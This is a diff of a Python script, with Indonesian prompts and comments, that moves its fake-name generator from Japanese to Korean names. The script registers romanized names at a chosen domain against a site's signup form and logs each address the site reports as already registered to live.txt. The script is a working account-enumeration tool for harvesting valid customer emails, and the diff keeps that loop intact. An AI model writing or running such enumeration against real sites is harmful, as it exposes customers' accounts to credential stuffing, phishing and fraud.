@@ -2,16 +2,10 @@ import requests
 from faker import Faker
 from random import randint
 import datetime
-import pykakasi
+from korean_romanizer.romanizer import Romanizer
 
-# Inisialisasi pykakasi untuk transliterasi
-kakasi = pykakasi.kakasi()
-kakasi.setMode('H', 'a')  # Hiragana ke alfabet
-kakasi.setMode('K', 'a')  # Katakana ke alfabet
-kakasi.setMode('J', 'a')  # Kanji ke alfabet
-conv = kakasi.getConverter()
-
-fake = Faker('ja_JP')
+# faker korea
+fake = Faker('ko_KR')
 now = datetime.datetime.now()
 domain = str(input('Domainya mau apa? :'))
 live = open('live.txt', 'w')
@@ -23,14 +17,13 @@ g = s.get(link, headers=head)
 
 print("-"*55)
 while True:
-    name = fake.name().replace(" ", "")
-    name_romaji = conv.do(name)  # Transliterasi nama ke Romaji
-    random_number = str(randint(0,31))
-    email = name_romaji + '@' + domain
+    name_hangul = fake.name().replace(" ", "")
+    name_romanized = Romanizer(name_hangul).romanize()
+    email = name_romanized + '@' + domain
     xxx = {'customerName':'Casein Nitrate','email': email,'password':'BirdyBirdySad012','passwordCheck':'BirdyBirdySad012'}
     cek = s.post(link, headers=head, data=xxx).text
     if "You indicated you're a new customer, but an account already exists with the email address" in cek:
-        print("\033[32;1mLIVE\033[0m | "+email+" | [("+now.strftime("%Y-%m-%d %H:%M:%S")+")]")
+        print(f"\033[32;1mLIVE\033[0m | {email} | [({now.strftime('%Y-%m-%d %H:%M:%S')})]")
         live.write(email + '\n')
     else:
-        print("\033[31;1mDIE\033[0m | "+email+" | [("+now.strftime("%Y-%m-%d %H:%M:%S")+")]")
+        print(f"\033[31;1mDIE\033[0m | {email} | [({now.strftime('%Y-%m-%d %H:%M:%S')})]")
